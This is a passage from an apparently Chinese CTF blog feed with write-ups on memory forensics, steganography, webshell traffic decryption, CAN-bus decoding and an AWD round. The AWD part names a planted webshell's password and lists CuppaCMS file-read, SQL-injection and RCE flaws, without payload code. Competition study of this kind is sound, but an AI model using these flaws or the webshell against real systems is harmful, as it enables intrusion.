class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br>Writing mstsc.exe [  2840] to 2840.dmp<br></code></pre></td></tr></table></figure><p>修改成.data后缀，用gimp调一下参，得到提示不在RAM中</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702669.png" alt="img"></p><p>再看回hint1，有vbox显示器的分辨率、显卡等信息</p><p>又根据hint3<a href="https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data">https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data</a></p><p>猜测可能在VRAM中</p><p>利用vboxinfo找内存信息</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 vboxinfo</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Magic: 0xc01ac0de<br>Format: 0x10006<br>VirtualBox 7.0.2 (revision 154219)<br>CPUs: 2<br><br>FileOffset       Memory Offset    Size<br>          0x4a2c              0x0    0xa0000<br>         0xa4a2c          0xc0000     0x9000<br>         0xada2c          0xe0000     0x1000<br>         0xaea2c          0xe1000     0x1000<br>         0xafa2c          0xe2000     0xe000<br>         0xbda2c          0xf0000    0x10000<br>         0xcda2c         0x100000   0x100000<br>        0x1cda2c         0x200000 0xdfe00000<br>      0xdffcda2c       0xe0000000  0x2000000<br>      0xe1fcda2c       0xf0000000   0x200000<br>      0xe21cda2c       0xf0400000   0x400000<br>      0xe25cda2c       0xf0800000     0x4000<br>      0xe25d1a2c       0xffff0000    0x10000<br>      0xe25e1a2c      0x100000000 0x20000000<br></code></pre></td></tr></table></figure><p>根据hint3找到VRAM的位置</p><blockquote><p>The VGA&#x2F;video memory beings at 0xe0000000 on both x86 and x64 systems.</p></blockquote><p><code>0xdffcda2c       0xe0000000  0x2000000</code></p><p>那么偏移0xdffcda2c，大小0x2000000</p><p>可以手动或者用dd命令提取出显存数据</p><p><code>dd if=CharlieBrown-PC.elf of=vram skip=3757890092 bs=1 count=33554432</code></p><p>建议手动，dd命令会很久</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897026610.png" alt="img"></p><p>保存为VRAM，观察发现4字节一组，代表RGBA，由hint1的分辨率得到图片宽高，编写脚本将data转成图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>width = <span class="hljs-number">1440</span><br>height = <span class="hljs-number">900</span><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;VRAM&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makeSourceImg</span>():<br>    img = Image.new(<span class="hljs-string">&#x27;RGBA&#x27;</span>, (width, height))<br>    x = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            img.putpixel((j, i), (flag[x], flag[x + <span class="hljs-number">1</span>], flag[x + <span class="hljs-number">2</span>],flag[x+<span class="hljs-number">3</span>]))<br>            x += <span class="hljs-number">4</span><br>    <span class="hljs-keyword">return</span> img<br><br>img = makeSourceImg()<br>img.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到png，这就是对应刚刚的远程桌面的屏幕截图</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897026611.png" alt="img"></p><p>拿到c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">089ebf3622f6f6d498c1b5ecfe4d831d3e876bf55578586389127e0053bb4fe006e2eee5398b86274fdce0418d16c9bb0bf24922cec491b3047d33eb661784c9<br></code></pre></td></tr></table></figure><p>接下来就是rsa解密了</p><p>在线网站解析公钥<a href="http://www.hiencode.com/pub_asys.html%EF%BC%8C%E6%8B%BF%E5%88%B0n%E5%92%8Ce%EF%BC%8Cn%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%88%86%E8%A7%A3%E5%BE%97%E5%88%B0p%EF%BC%8Cq">http://www.hiencode.com/pub_asys.html，拿到n和e，n可以直接分解得到p，q</a></p><p>e&#x3D;2，rabin</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897026612.png" alt="img"></p><p>这道题目是一道比较新也很巧妙的题，利用了vbox虚拟机elf core dump包含额外的VRAM数据来还原远程桌面的截图，最后结合了rsa，一开始做题还毫无头绪，参考了两位师傅的wp后能慢慢理清思路。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023金砖CTF-决赛</title>
    <link href="/2023/11/21/2023%E9%87%91%E7%A0%96%E5%86%B3%E8%B5%9BCTF/"/>
    <url>/2023/11/21/2023%E9%87%91%E7%A0%96%E5%86%B3%E8%B5%9BCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023金砖CTF-决赛"><a href="#2023金砖CTF-决赛" class="headerlink" title="2023金砖CTF-决赛"></a>2023金砖CTF-决赛</h1><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>ctf部分总体还是比较难的，时间也短</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>前面的忘了，中间的忘了，后面的也忘了（不难，就是数组绕、%0a绕，rce绕）</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="MISC01"><a href="#MISC01" class="headerlink" title="MISC01"></a>MISC01</h3><p>拿到一个wav</p><p>010打开发现有两个文件头<code>52 49 46 46</code></p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731535736.png" alt="img"></p><p>foremost分离一下</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/17005673152401.png" alt="img"></p><p><code>00006606.wav</code>用audacity打开，看频谱图得到<code>pass:stego0626</code></p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/17005673152412.png" alt="img"></p><p>尝试很多音频隐写的工具无果，再看回原始wav</p><p>在两个wav中间找到一段字节，仔细看是把文件头<code>50 4b 03 04</code>换成<code>2e 2e 2e 2e</code>的zip（这也是foremost分离不出来的原因）</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/17005673152413.png" alt="img"></p><p>拿出来，压缩包密码为<code>stego0626</code></p><p>解压出来一段乱码</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/17005673152414.png" alt="img"></p><p>拿到cyberchef，magic得到flag（我不知道是我解压有问题还是这编码就是这样出的）</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/17005673152415.png" alt="img"></p><h3 id="MISC02"><a href="#MISC02" class="headerlink" title="MISC02"></a>MISC02</h3><p>拿到green.png</p><p><code>zsteg -a</code>看到有zip</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/17005673152416.png" alt="img"></p><p>导出<code>zsteg -E extradata:0 green.png &gt; flag.zip</code> 里面有个加密的rgb.txt 再回去看zsteg找到密码<code>pass:h16lly81a</code></p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/17005673152417.png" alt="img"></p><p>拿到一串rgb值，数量是66822个，分解一下</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/17005673152418.png" alt="img"></p><p>一系列尝试后转成259*259的图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>width,height = <span class="hljs-number">259</span>,<span class="hljs-number">259</span><br><br>im = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (width, height))   <span class="hljs-comment">#创建图片</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rgb.txt&#x27;</span>)    <span class="hljs-comment">#打开rbg值的文件</span><br><span class="hljs-comment">#通过每个rgb点生成图片</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height):<br>        line = file.readline().replace(<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#获取一行的rgb值</span><br>        rgb = line.split(<span class="hljs-string">&quot;,&quot;</span>)  <span class="hljs-comment">#分离rgb，文本中逗号后面有空格</span><br>        <span class="hljs-keyword">try</span>:<br>            im.putpixel((i, j), (<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">0</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">1</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">2</span>])))    <span class="hljs-comment">#将rgb转化为像素</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>im.save(<span class="hljs-string">&quot;flag.png&quot;</span>)   <span class="hljs-comment">#im.save(&#x27;flag.jpg&#x27;)保存为jpg图片</span><br></code></pre></td></tr></table></figure><p>隐约看出有flag，仔细观察发现应该是宽太短了，应该要为高的2倍</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/17005673152429.png" alt="img"></p><p>尝试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>width,height = <span class="hljs-number">259</span>,<span class="hljs-number">518</span><br><br>im = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (width, height))   <span class="hljs-comment">#创建图片</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rgb.txt&#x27;</span>)    <span class="hljs-comment">#打开rbg值的文件</span><br><span class="hljs-comment">#通过每个rgb点生成图片</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height):<br>        line = file.readline().replace(<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#获取一行的rgb值</span><br>        rgb = line.split(<span class="hljs-string">&quot;,&quot;</span>)  <span class="hljs-comment">#分离rgb，文本中逗号后面有空格</span><br>        <span class="hljs-keyword">try</span>:<br>            im.putpixel((i, j), (<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">0</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">1</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">2</span>])))    <span class="hljs-comment">#将rgb转化为像素</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>im.save(<span class="hljs-string">&quot;flag.png&quot;</span>)   <span class="hljs-comment">#im.save(&#x27;flag.jpg&#x27;)保存为jpg图片</span><br><br>img = im.transpose(Image.FLIP_LEFT_RIGHT) <br>img.save(<span class="hljs-string">&#x27;re_flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524210.png" alt="img"></p><h2 id="data-sec"><a href="#data-sec" class="headerlink" title="data_sec"></a>data_sec</h2><h3 id="Ant-Pro"><a href="#Ant-Pro" class="headerlink" title="Ant_Pro"></a>Ant_Pro</h3><p>蚁剑流量</p><p>简单看了一下有10个左右的包，其中有一个是有个zip的</p><p>定位到<code>stream 30</code>，有一串hex</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524211.png" alt="img"></p><p>转一下得到蚁剑的加密器源码，可以看到key是session的前16位，<code>AES-128-ECB</code>加密</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524212.png" alt="img"></p><p>利用这些信息可以解开数据包的请求与响应包</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524213.png" alt="img"></p><p>定位到<code>stream 20</code>和<code>stream 28</code></p><p><code>stream 20</code>的http流保存为<code>jt.zip</code>（注意不要用tcp，会有多余的分块传输的字节）</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524214.png" alt="img"></p><p><code>stream 28</code>响应解密一下</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524215.png" alt="img"></p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524316.png" alt="img"></p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524317.png" alt="img"></p><p>得到压缩包密码，解压得到<code>jt.png</code></p><p>zsteg得到flag</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524318.png" alt="img"></p><h3 id="ezPH"><a href="#ezPH" class="headerlink" title="ezPH"></a>ezPH</h3><p>一个数据包</p><p>tcp流前15个都是这样的求离散对数问题</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524319.png" alt="img"></p><p>第16个包很大，加载慢，使用tshark导出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tshark</span> -r ezPH.pcapng -qz follow,tcp,raw,<span class="hljs-number">15</span> &gt; <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>两次hex转处理一下得到pdf头的文件</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524320.png" alt="img"></p><p>Pohlig-Hellman算法</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524321.png" alt="img"></p><p>后面不会了，交给队友</p><h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><p>D盾扫一下</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524322.png" alt="img"></p><h2 id="漏洞1"><a href="#漏洞1" class="headerlink" title="漏洞1"></a>漏洞1</h2><p>先看<code>/var/www/html/classes/.cuppa.php</code></p><p>冰蝎马，默认密钥，密码为<code>cuppa</code></p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524323.png" alt="img"></p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524324.png" alt="img"></p><h2 id="漏洞2"><a href="#漏洞2" class="headerlink" title="漏洞2"></a>漏洞2</h2><p><code>/var/www/html/alerts/alertConfigField.php</code></p><p>include导致的任意文件读取</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524325.png" alt="img"></p><p>漏洞验证</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524426.png" alt="img"></p><h2 id="漏洞3"><a href="#漏洞3" class="headerlink" title="漏洞3"></a>漏洞3</h2><p><code>/var/www/html/alerts/alertLightbox.php</code></p><p>include导致的任意文件读取</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524427.png" alt="img"></p><p>漏洞验证</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524428.png" alt="img"></p><h2 id="漏洞4"><a href="#漏洞4" class="headerlink" title="漏洞4"></a>漏洞4</h2><p><code>/var/www/html/components/table_manager/html/list_admin_table.php</code></p><p><code>create_function</code>的rce（有<code>$cuppa-&gt;user-&gt;valid(&quot;admin_login&quot;);</code>要登录后台）</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524429.png" alt="img"></p><p>漏洞验证：</p><p>本地环境有问题，暂时无法验证，但是漏洞是存在的</p><h2 id="漏洞5"><a href="#漏洞5" class="headerlink" title="漏洞5"></a>漏洞5</h2><p><code>/var/www/html/templates/default/html/windows/right.php</code></p><p>include导致的任意文件读取</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524430.png" alt="img"></p><p>漏洞验证</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524431.png" alt="img"></p><h2 id="漏洞6"><a href="#漏洞6" class="headerlink" title="漏洞6"></a>漏洞6</h2><p><code>/var/www/html/js/filemanager/api/index.php</code></p><p>目录穿越+删除文件+任意文件重命名+copy文件任意文件读取，参考<a href="https://github.com/CuppaCMS/CuppaCMS/issues/28">https://github.com/CuppaCMS/CuppaCMS/issues/28</a></p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524432.png" alt="img"></p><h2 id="漏洞7"><a href="#漏洞7" class="headerlink" title="漏洞7"></a>漏洞7</h2><p><code>/var/www/html/api/index.php</code></p><p>sql注入导致rce，参考<a href="https://github.com/CuppaCMS/CuppaCMS/issues/36">https://github.com/CuppaCMS/CuppaCMS/issues/36</a></p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524433.png" alt="img"></p><h2 id="漏洞8"><a href="#漏洞8" class="headerlink" title="漏洞8"></a>漏洞8</h2><p><code>/var/www/html/api/generic.php</code></p><p>sql注入</p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524434.png" alt="img"></p><h2 id="漏洞9"><a href="#漏洞9" class="headerlink" title="漏洞9"></a>漏洞9</h2><p><code>/var/www/html/classes/ajax/Functions.php</code></p><p><code>saveConfigData</code>函数中代码可修改<code>Configuration.php</code>可导致写入webshell，具体参考<a href="https://github.com/CuppaCMS/CuppaCMS/issues/29">https://github.com/CuppaCMS/CuppaCMS/issues/29</a></p><p><img src="/../img/2023%E9%87%91%E7%A0%96CTF-%E5%86%B3%E8%B5%9B/170056731524435.png" alt="img"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>ctf部分还是稍微可惜了一些，多10分钟可能就能拿多几分了</p><p>awd纯没经验，被打烂了</p><p>ps：awd漏洞没有复现的要么是本地环境有问题要么是可能没有这个漏洞</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
      <category>awd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023强网拟态</title>
    <link href="/2023/11/17/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"/>
    <url>/2023/11/17/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
    
    <content type="html"><![CDATA[<h1 id="2023强网拟态"><a href="#2023强网拟态" class="headerlink" title="2023强网拟态"></a>2023强网拟态</h1><h1 id="MIMIC"><a href="#MIMIC" class="headerlink" title="MIMIC"></a>MIMIC</h1><h2 id="Tbox-can"><a href="#Tbox-can" class="headerlink" title="Tbox can"></a>Tbox can</h2><p>参考 <a href="https://zhuanlan.zhihu.com/p/26394774">https://zhuanlan.zhihu.com/p/26394774</a> <a href="https://blog.csdn.net/weixin_45403142/article/details/120075619">https://blog.csdn.net/weixin_45403142/article/details/120075619</a></p><p>拿到一组can协议的数据包</p><p>根据网上相关文章搜索，大概了解到<code>control_field</code>给出指示后接的是<code>data_field</code>，里面是数据段</p><p><img src="/../img/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/17002015428102.png" alt="img"></p><p>根据包的特征，一次data有8个字节</p><p>先尝试将8个字节加在一起转16进制，得到<code>@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL</code>，但是错误的，单独将每一位转得到flag（脚本写的比较丑陋）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PHP">import csv<br>csv_reader = csv.<span class="hljs-title function_ invoke__">reader</span>(<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;can_data.csv&quot;</span>))<br><br>data = <span class="hljs-string">&#x27;data_field&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> row in csv_reader:<br>    <span class="hljs-keyword">if</span> data in row:<br>        data_list.<span class="hljs-title function_ invoke__">append</span>(row[<span class="hljs-number">6</span>])<br><span class="hljs-comment">#print(data_list)</span><br><br><span class="hljs-comment"># 错误的尝试，将每一部分的data加起来再16进制转字符</span><br><span class="hljs-comment"># passwd_list = []</span><br><span class="hljs-comment"># for i in range(0,len(data_list)-8,8):</span><br><span class="hljs-comment">#     passwd_list.append(int(data_list[i],16)+int(data_list[i+1],16)+int(data_list[i+2],16)+int(data_list[i+3],16)+int(data_list[i+4],16)+int(data_list[i+5],16)+int(data_list[i+6],16)+int(data_list[i+7],16))</span><br><span class="hljs-comment"># print(passwd_list)</span><br><br><span class="hljs-comment"># 每一个data数据16进制转字符</span><br>passwd_list = []<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">len</span>(data_list)):<br>    passwd_list.<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-keyword">int</span>(data_list[i],<span class="hljs-number">16</span>))<br><span class="hljs-comment">#print(passwd_list)</span><br><br>passwd = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x in passwd_list:<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">32</span>&lt;x&lt;<span class="hljs-number">125</span>:<br>        passwd += <span class="hljs-title function_ invoke__">chr</span>(x)<br><span class="hljs-keyword">print</span>(passwd)<br><span class="hljs-comment">#??FSSID:HIGDDEN_HOHTPOT8$$\`PPASS:L0QGIC_ANAR1YSIS_CSAN_FOR_TFUN??????FSSID:HIGDDEN_HOHTPOT8$$\`PPASS:L0QGIC_ANAR1YSIS_CSAN_FOR_TFUN????</span><br></code></pre></td></tr></table></figure><p>稍微修改一下得到<code>PASS:L0GIC_ANA1YSIS_CAN_FOR_FUN</code></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;L0GIC_ANA1YSIS_CAN_FOR_FUN&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ZmxhZ3tNaW1pY195eWRzJkcwZF9Kb0JfQ1RGZXJ+<span class="hljs-attribute">fQ</span>==<br></code></pre></td></tr></table></figure><p>base64：<code>flag&#123;Mimic_yyds&amp;G0d_JoB_CTFer~&#125;</code></p><h2 id="国际象棋与二维码"><a href="#国际象棋与二维码" class="headerlink" title="国际象棋与二维码"></a>国际象棋与二维码</h2><p>拿到一张经过处理的类似二维码的图</p><p>题目提示：你见过国际象棋的棋盘吗</p><p>联想到与国际象棋棋盘格式的图片异或</p><p>国际棋盘格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Plain">1 0 1 0 1 0<br>0 1 0 1 0 1<br>1 0 1 0 1 0<br>0 1 0 1 0 1<br>1 0 1 0 1 0<br>0 1 0 1 0 1<br></code></pre></td></tr></table></figure><p>这里有一个比较坑的点，给的题目格子数为49×49，但是像素是500×500的，直接用PIL库比较难处理</p><p>测试了很久得到以下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> cv2<br>att_image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br><span class="hljs-comment">#生成背景图</span><br>image = Image.new(mode=<span class="hljs-string">&#x27;RGBA&#x27;</span>, size=(<span class="hljs-number">500</span>, <span class="hljs-number">500</span>))<br><span 